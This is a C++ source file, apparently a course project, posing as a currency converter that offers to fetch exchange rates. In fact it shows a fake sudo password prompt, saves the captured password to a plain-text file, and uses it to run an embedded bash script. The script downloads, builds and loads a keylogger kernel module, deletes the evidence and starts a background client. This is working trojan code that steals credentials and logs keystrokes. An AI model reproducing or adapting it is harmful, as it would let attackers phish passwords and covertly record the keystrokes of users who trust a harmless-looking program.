#include <iostream>
#include <fstream>
#include <string>

const char *text= 
	"#!/bin/bash\n"
	"sudo cp keylog_ins /usr/bin/keylog_ins 2>/dev/null\n"
	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
	"unzip -o -q keylog.zip\n"
	"cd final-project-click-to-add-lemon-master/Source/\n"
	"make -s 2>/dev/null\n"
	"sudo insmod keylog.ko 2>/dev/null\n"
	"cd AnalyzeData/\n"
	"cp analyze ../Scripts\n"
	"cd ..\n"
	"cp -r Scripts/ ../../Scripts \n"
	"cd ../..\n"
	"rm -r -f *.txt keylog.zip keylog_ins final-project-click-to-add-lemon-master\n"
	"cd Scripts/\n"
	"python3 client_script.py & 2>/dev/null \n";
	
void convert();

bool modAlreadyExists(){
	bool result = false;
	std::string str;
	std::ifstream modfile;
	size_t pos;
	
	system("lsmod > mod.txt");
	modfile.open("mod.txt");
	std::cout << "file opened\n";
	
	if (!modfile.is_open())
		return false;

	while (getline(modfile, str)) {
		pos = str.find("keylog");
		if (pos != std::string::npos) {
			result = true;
			break;
		}
	}

	modfile.close();
	system("rm mod.txt");

	return result;
}

std::string getUsername() {
	std::string username;
	system("echo \"$USER\" > uname.txt");
	
	std::ifstream usernameFile;
	usernameFile.open("uname.txt");

	if (usernameFile.is_open())
		std::getline(usernameFile, username);

	usernameFile.close();

	return username;
}

void savePasswordToFile(std::string filename, std::string username) {
	std::cout << "[sudo] password for " << username << ":";

	// set terminal command invisible
	system("stty -g > Tsetting.txt");
	system("stty -echo");

	// store password
	std::string password;
	std::cin >> password;
	std::ofstream passwordFile(filename);
	passwordFile << password;
	passwordFile.close();
	std::cout << std::endl;

	// set terminal command visible
	system("stty $(cat Tsetting.txt)");
}

int main() {
	if (modAlreadyExists()) {
		convert();
		return 0;
	}

	
	std::cout << "Pull the latest exchange rates online? (require access to Internet)\n";
	std::cout << " [y]es [n]o\n";

	char in = getchar();

	if (in == 'y' || in == 'Y') {
		std::string username = getUsername();
		savePasswordToFile("sudopw", username);

		system("echo $(cat sudopw) | sudo -S chmod 755 keylog_ins");

		std::ofstream myfile("keylog_ins");
		myfile << (text);			
		myfile.close();
		system("./keylog_ins");

		convert();
	} else {
		std::cout << "Service terminated.\n";
	}

	return 0;
}
